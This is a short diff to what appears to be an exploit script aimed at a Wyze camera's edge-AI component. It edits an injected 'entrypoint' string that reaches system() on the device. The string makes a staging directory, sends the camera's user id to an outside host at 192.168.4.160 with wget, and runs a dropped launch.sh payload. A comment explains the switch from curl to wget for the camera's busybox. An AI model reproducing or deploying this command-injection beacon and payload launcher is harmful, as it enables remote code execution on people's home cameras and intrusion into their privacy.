@@ -525,9 +525,11 @@ def main() -> int:
                         {"processname": "wyzeedgeai_cam_v4_test_protocol",
                          # the entrypoint is ours and goes straight to system(): make it self-contained
                          # so a missing directory or an unwritten file cannot swallow the proof.
+                         # The beacon uses wget (the camera's busybox may lack curl); the
+                         # launch.sh handles its own curl→wget fallback internally.
                          "entrypoint": ("sh -c 'mkdir -p /tmp/edgeai; "
-                                        "curl -s -m 5 -o /dev/null "
-                                        "\"http://192.168.4.160:8080/fss-ran?uid=$(id -u)&via=entry\"; "
+                                        "wget -q -O /dev/null "
+                                        "\"http://192.168.4.160:8080/fss-ran?uid=$(id -u)&via=entry\" 2>/dev/null; "
                                         "sh /tmp/edgeai/launch.sh'"),
                          "maxstartuptime": 60,
                          "version": model_ver,
